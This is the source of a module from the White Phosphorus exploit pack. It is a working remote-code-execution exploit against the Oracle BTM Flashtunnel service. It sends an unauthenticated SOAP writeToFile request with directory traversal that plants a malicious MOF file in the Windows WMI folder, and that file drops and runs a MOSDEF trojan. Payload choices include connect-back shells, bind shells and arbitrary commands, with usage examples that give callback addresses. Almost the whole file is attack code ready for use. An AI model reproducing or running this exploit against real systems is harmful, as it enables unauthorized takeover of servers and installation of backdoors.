
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer
from MOSDEF import pelib
from libs.canvasos import canvasos
import libs.spkproxy as spkproxy


NAME = "Oracle Business Transaction Mangement Server Flashtunnel Remote Code Execution"
DESCRIPTION = "Exploits a remote code execution vulnerability in Oracle BTM Flashtunnel Service"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Oracle'
DOCUMENTATION["Date public"] = "2012-08-07"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="N/A"
DOCUMENTATION['CVE Url'] = 'N/A'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/20318/"
DOCUMENTATION["Notes"] = """
This module uses an unauthenticated WriteFile vulnerability with directory traversal to leverage remote code execution by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it.
All dropped files must be removed manually.
Vulnerability limits shellcode options.
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2003", "XP"]

NOTES="""
This module uses an unauthenticated WriteFile vulnerability with directory traversal to leverage remote code execution by writing a malicious MOF file to %systemroot%\system32\wbem\mof\ using the Wbem Mof technique found in the Stuxnet worm. When the MOF is executed it drops a MOSDEF PE Trojan in the Default User profile directory and runs it.
All dropped files must be removed manually.
Vulnerability limits shellcode options.

----------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Oracle Business Transaction Mangement Server Flashtunnel Remote Code Execution
----------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: Bind MOSDEF Shell
3: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_oracle_btm_flashtunnel/wp_oracle_btm_flashtunnel.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 7001

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x09\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.vProtect = True
        self.useRawShellcode = True
        self.payloadFilename = "".join( [ random.choice(string.lowercase) for x in range(16) ] ) + '.mof'
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        return wp_bannerchecktest(self,self.host,self.port,{"Oracle BTM Login": 1},1000,"GET /btmui/Login.html HTTP/1.0\r\n\r\n")

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        self.log("WP> Building MOSDEF PE Trojan")
        myPElib = pelib.PElib()
        try:
            self.mosdeftrojan=myPElib.createPEFileBuf(self.shellcode)
        except Exception, err:
            self.log("WP> Problem building MOSDEF PE Trojan: %s"%(err))
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0
        
        self.log("WP> Packing Trojan in Malcious .mof")
        self.mosdeftrojan = wp_GenerateMOF(self.mosdeftrojan)
        
        payload = r'''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:int="http://schemas.amberpoint.com/flashtunnel/interfaces" xmlns:typ="http://schemas.amberpoint.com/flashtunnel/types">
   <soapenv:Header/>
   <soapenv:Body>
      <int:writeToFileRequest>
         <int:writeToFile handle="..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\Windows\system32\wbem\mof\%s">
            <typ:text><![CDATA[%s]]></typ:text>
         </int:writeToFile>
      </int:writeToFileRequest>
   </soapenv:Body>
</soapenv:Envelope>
''' % (self.payloadFilename,
       self.mosdeftrojan)
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()        
        useragentstring = "http://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        UA.addHeader('Content-Type','text/xml;charset=UTF-8')
        UA.addHeader('SOAPAction','\"http://soa.amberpoint.com/writeToFile\"')
        
        self.log("WP> Sending Exploit")
        data = UA.POST("/btmui/soa/flash_svc/", "%s\r\n\r\n"%payload, noresponse=False)
        
        time.sleep(10)
        ret=self.ISucceeded()
        if ret:
            self.setInfo("WP> %s attacking %s:%d - completed (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
